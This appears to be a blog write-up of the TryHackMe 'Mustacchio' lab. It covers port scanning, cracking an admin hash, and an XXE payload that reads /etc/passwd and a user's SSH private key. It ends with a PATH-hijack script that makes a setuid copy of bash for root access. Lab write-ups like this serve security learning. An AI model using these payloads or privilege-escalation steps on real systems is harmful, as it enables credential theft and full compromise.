---
title: "Mustacchio"
date: 2025-3-7
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Medium
---


## Enumeration
```
nmap -sVC 10.10.23.211        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 16:05 +0545
Nmap scan report for 10.10.23.211 (10.10.23.211)
Host is up (0.21s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.74 seconds

```

```
rustscan -a 10.10.23.211        
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/k21/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.23.211:22
Open 10.10.23.211:80
Open 10.10.23.211:8765
[~] Starting Script(s)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 16:09 +0545
Initiating Ping Scan at 16:09
Scanning 10.10.23.211 [4 ports]
Completed Ping Scan at 16:09, 3.04s elapsed (1 total hosts)
Nmap scan report for 10.10.23.211 [host down, received no-response]
Read data files from: /usr/share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.22 seconds
           Raw packets sent: 8 (304B) | Rcvd: 0 (0B)
```


Lets see in port 80.
![](Pasted%20image%2020250307161310.png)

Hmm lets do directory busting.
![](Pasted%20image%2020250307161452.png)

Lets enumerate all.
And we can find this.
![](Pasted%20image%2020250307161809.png)

And we got something.
![](Pasted%20image%2020250307161952.png)

But we haven't face any login pages.
Hmmm.
`admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`

There was something in port 8765.
Lets see.
And we got the login page.

![](Pasted%20image%2020250307162237.png)

Lets try to login.
But we could not.
Wait it might be hash.
![](Pasted%20image%2020250307162507.png)

Hmm so we got the password.
`bulldog19`.

We logged in.
![](Pasted%20image%2020250307162600.png)

## Exploit

Hmm so the page only have a comment doing feature.
We might do XXS,XXE,SSRF or similar.

Lets try what we can do.

Lets first of all capture the request in burp.
![](Pasted%20image%2020250307163125.png)

And it is using xml to send data to server.
We might exploit it.

Lets use xxe payloads to do so.
And more interesting thing.
![](Pasted%20image%2020250307164549.png)
![](Pasted%20image%2020250307164709.png)

Hmm.
![](Pasted%20image%2020250307164744.png)

So we could do so.
![](Pasted%20image%2020250307165757.png)

Now we can make or get a simple xxe paylaod to read file cntent.
```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>

```

So what is happening here,
- first we are making DTD which will have the content of `/etc/passwd`.
- After that we are declaring that in `<com></com>`.
- So that xxe will contain the content of `/etc/passwd`.
- We also have to do url encode.

And we are successful.
![](Pasted%20image%2020250307170707.png)

Now we know that message and users.
![](Pasted%20image%2020250307170741.png)

## Foothold

Lets try to read a private key.
And we can successfully read `/home/barry/.ssh/id_rsa`.
![](Pasted%20image%2020250307170926.png)

Lets try to do ssh.
But first we have to crack the hash.
![](Pasted%20image%2020250307171022.png)
And it was very quick.
![](Pasted%20image%2020250307171059.png)

Lets do ssh as barry.
![](Pasted%20image%2020250307171531.png)

## Privelege Escalation

Now lets enumerate further.
Hmm interesting thing in joes home directory.
![](Pasted%20image%2020250307171644.png)

And doing strings revealed it is using a command tail to reaf `/var/log/nginx/access.log`.
![](Pasted%20image%2020250307171750.png)

Lets check that log file too.
But we don't have a permission.
![](Pasted%20image%2020250307171938.png)

What can we do?
We can execute it and we can see but nothing there too.
![](Pasted%20image%2020250307172048.png)


Now the question is can we change the $PATH variable.
Lets see.
`export PATH=/tmp:$PATH`
`echo $PATH`
![](Pasted%20image%2020250307172522.png)

And its possible.
Now lets create our own tail command.
```
#!/bin/bash
cp /bin/bash /tmp/root && chmod 4777 /tmp/root
echo "Done."

```

Hmm and we will give a executable permission.
Now if that binary tried to run tail command,our small script will run.
![](Pasted%20image%2020250307172830.png)
![](Pasted%20image%2020250307172849.png)

and we got it.
![](Pasted%20image%2020250307172919.png)

## Done

And done.
![](Pasted%20image%2020250307172957.png)

Now we can put our ssh public key in `/root/.ssh/authorized_keys` and get stable root shell.

And lots of thing learned again.
I hope you enjoyed doing this and learned new thing.
